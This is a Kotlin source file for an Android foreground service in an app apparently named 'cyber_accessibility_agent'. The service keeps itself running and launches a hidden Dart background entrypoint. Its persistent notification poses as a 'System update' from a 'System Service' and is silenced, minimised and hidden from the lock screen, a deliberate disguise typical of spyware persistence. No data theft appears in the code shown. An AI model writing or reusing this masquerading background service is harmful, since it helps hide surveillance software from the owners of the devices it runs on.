// android/app/src/main/kotlin/.../AgentService.kt
package com.example.cyber_accessibility_agent

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.embedding.engine.dart.DartExecutor
import io.flutter.embedding.engine.loader.FlutterLoader
import io.flutter.plugins.GeneratedPluginRegistrant
import java.util.concurrent.Executors

class AgentService : Service() {

    companion object {
        const val CHANNEL_ID = "sys_core"
        const val NOTIF_ID = 1001
        const val ACTION_START = "agent_start"
    }

    private val TAG = "AgentService"
    private var flutterEngine: FlutterEngine? = null
    private val executor = Executors.newSingleThreadExecutor()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
        Log.i(TAG, "Foreground AgentService started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (flutterEngine == null) {
            executor.execute { initFlutter() }
        }
        return START_STICKY
    }

    private fun initFlutter() {
        try {
            val loader = FlutterLoader()
            loader.startInitialization(applicationContext)
            loader.ensureInitializationComplete(applicationContext, null)

            val engine = FlutterEngine(applicationContext)

            // Register plugins so MethodChannels and other plugins work in headless mode
            GeneratedPluginRegistrant.registerWith(engine)

            val entrypoint = DartExecutor.DartEntrypoint(
                loader.findAppBundlePath(),
                "backgroundMain"
            )

            engine.dartExecutor.executeDartEntrypoint(entrypoint)

            flutterEngine = engine
            Log.i(TAG, "Headless FlutterEngine started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start FlutterEngine", e)
        }
    }

    override fun onDestroy() {
        try {
            flutterEngine?.destroy()
        } catch (e: Exception) {
            Log.w(TAG, "Error destroying flutterEngine", e)
        }
        flutterEngine = null
        executor.shutdownNow()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ---------- Notification ----------

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            try {
                nm.createNotificationChannel(channel)
            } catch (e: Exception) {
                Log.w(TAG, "createNotificationChannel failed", e)
            }
        }
    }

    private fun buildNotification(): Notification {
        val iconRes = resources.getIdentifier("ic_sys_dot", "drawable", packageName)
        val icon = if (iconRes != 0) iconRes else R.mipmap.ic_launcher

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(icon)
            .setContentTitle("System update")
            .setContentText("System update are available.")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .build()
    }
}